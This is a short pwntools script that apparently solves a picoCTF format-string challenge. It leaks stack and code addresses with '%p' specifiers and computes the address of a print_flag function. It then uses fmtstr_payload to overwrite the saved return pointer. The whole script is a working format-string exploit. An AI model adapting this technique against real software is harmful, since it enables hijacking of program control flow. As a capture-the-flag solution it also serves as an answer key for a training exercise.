from pwn import *

context.arch = 'amd64'
# 1. Start the connection
p = remote('shape-facility.picoctf.net', 57982)

# 2. Leak
p.sendline(b"%21$p %20$p")
p.recvuntil(b"heard in the distance: ")
leaks = p.recvline().split()
leak_main = int(leaks[0], 16)
leak_stack = int(leaks[1], 16)

# 3. Calculate (Using your specific offset logic)
main_addr = (leak_main & ~0xfff) | 0x401 
# Apply adjustment to point to print_flag()
print_flag_addr = main_addr - (0x1401 - 0x1269) # Values from GDB disassemble

return_ptr_loc = leak_stack + 8 

# 4. Construct and Send
# Offset: 6 refers to the number of pointers before buffer (in this case we count 6)
payload = fmtstr_payload(6, {return_ptr_loc: print_flag_addr}, write_size='short')

p.sendline(payload)
p.sendline(b"exit") # This triggers the jump!

p.interactive()
